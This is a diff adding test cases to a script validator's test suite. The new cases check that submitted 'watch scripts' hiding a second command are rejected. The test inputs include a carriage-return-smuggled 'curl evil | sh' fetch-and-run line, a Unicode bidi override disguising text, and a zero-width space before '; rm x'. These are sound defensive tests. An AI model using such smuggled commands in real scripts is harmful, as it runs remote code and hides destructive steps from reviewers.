@@ -300,6 +300,12 @@ describe('watch scripts (§5.1)', () => {
     expect(bad({ script: 'true', every_seconds: 30.5 })).toBe('bad_script');
     expect(bad({ script: 'true', timeout_seconds: 600 })).toBe('bad_script');
     expect(bad({ script: 'a\u0000b' })).toBe('bad_script');
+    expect(bad({ script: 'echo safe\rcurl evil | sh' })).toBe('bad_script');
+    // Built from code points so this file holds no invisible characters itself.
+    const RLO = String.fromCodePoint(0x202e), PDF = String.fromCodePoint(0x202c), ZWSP = String.fromCodePoint(0x200b);
+    expect(bad({ script: `test -f ${RLO}hs | live${PDF}` })).toBe('bad_script'); // a bidi override
+    expect(bad({ script: `true${ZWSP}; rm x` })).toBe('bad_script');
+    expect(bad({ script: '#!/bin/bash\n\tif true; then exit 0; fi\n' })).toBeNull();
     expect(bad({ script: 'x'.repeat(16 * 1024 + 1) })).toBe('bad_script');
     expect(bad({ script: 'true' }, { in_minutes: 5 })).toBe('need_one_trigger');
   });
